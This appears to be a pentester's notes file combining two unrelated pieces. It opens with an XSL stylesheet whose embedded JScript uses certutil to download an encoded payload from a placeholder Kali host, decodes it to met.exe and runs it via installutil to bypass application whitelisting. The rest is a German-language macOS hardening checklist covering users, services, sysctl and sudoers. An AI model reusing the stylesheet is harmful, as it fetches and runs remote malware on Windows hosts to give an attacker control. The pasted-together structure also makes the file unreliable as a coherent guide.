<?xml version='1.0'?>
<stylesheet version="1.0"
xmlns="http://www.w3.org/1999/XSL/Transform"
xmlns:ms="urn:schemas-microsoft-com:xslt"
xmlns:user="http://mycompany.com/mynamespace%22%3E

<output method="text"/>
  <ms:script implements-prefix="user" language="JScript">
    <![CDATA[
      var ob = new ActiveXObject("WScript.Shell");
      ob.Run("certutil.exe -urlcache -f http://<Kali_IP_web>/met.enc C:\Users\Public\met.enc", 0, true);
      ob.Run("certutil.exe -decode C:\Users\Public\met.enc C:\Users\Public\met.exe", 0, true);
      ob.Run("C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U C:\Users\Public\met.exe", 0, true);
    ]]>
  </ms:script>
</stylesheet>













# Lynis hat ein OSX Modul!!!


# User
dscl . -read /Users/root AuthenticationAuthority
## Nutzer entfernen
dscl . -list /Users
dscl . -read /Users/<username>
dscl . -delete /Users/<username>

# Auch mal in die /etc/passwd schauen. nur zur sicherheit, die wird eigentlich nur für lokale anmeldung im single-user-mode genutzt.

## Passwörter ändern
 dscl . -passwd /Users/username
 
## Gruppen anpassen
dscl . -list /Groups
dscl . -list /Groups GroupMembership
dseditgroup -o edit -d <username_to_delete> -t user <groupname>  
#dseditgroup -o edit -d "clarketm" -t user "employees"

dscl . -change /Users/<username> PrimaryGroupID <old_id> <new_id>
dscl . -change /Users/clarketm PrimaryGroupID 1000 1001

# Software update
softwareupdate --list
sudo softwareupdate -i <packagename>

#updateserver sind vermutlich in der /etc/hosts auf localhost gesetzt!!!!!

# Firewall einschalten! Geht dummerweise in der grafischen Oberfläche am einfachtsten: Settings-> Security->Firewall und Settings->Sharing die Dienste deaktivieren.
# Dienste
sudo systemsetup -getremoteappleevents
sudo systemsetup -setremoteappleevents off

## lauchd locations
/Library/LaunchDaemons
/System/Library/LaunchAgents
/System/Library/LaunchDaemons

visudo /etc/sudoers
Defaults timestamp_timeout=0
Defaults tty_tickets


sudo find / -perm -04000 -ls
sudo find / -perm -02000 -ls
chmod u-s #file
chmod g-s #file

sudo launchctl unload -w /System/Library/LaunchAgents/AppleFileServer.plist
# disable services
sudo launchctl unload -w /System/Library/LaunchAgents/<Service>
com.apple.AppleFileServer.plist
ftp.plist
smbd.plist
org.apache.httpd.plist
eppc.plist
com.apple.xgridagentd.plist
com.apple.xgridcontrollerd.plist
com.apple.InternetSharing.plist
com.apple.dashboard.advisory.fetch.plist
com.apple.UserNotificationCenter.plist
----
com.apple.RemoteDesktop.PrivilegeProxy.plist
com.apple.RemoteDesktop.plist
----
com.apple.netbiosd.plist
com.apple.gamed.plist






/etc/sysctl.conf
net.inet.ip.fw.verbose = 1
net.inet.ip.fw.verbose_limit = 65535
net.inet.icmp.icmplim = 1024
net.inet.icmp.drop_redirect = 1
net.inet.icmp.log_redirect = 1
net.inet.ip.redirect = 0
net.inet.ip.sourceroute = 0
net.inet.ip.accept_sourceroute = 0
net.inet.icmp.bmcastecho = 0
net.inet.icmp.maskrepl = 0
net.inet.tcp.delayed_ack = 0
net.inet.ip.forwarding = 0
net.inet.tcp.strict_rfc1948 = 1

# disable bonjour
csrutil disable
sudo defaults write /System/Library/LaunchDaemons/com.apple.mDNSResponder.plist ProgramArguments -array-add "-NoMulticastAdvertisements"
csrutil enable


---------------

    System Preferences → Security & Privacy → Advanced
    Set “Require an administrator password to access system-wide preferences”

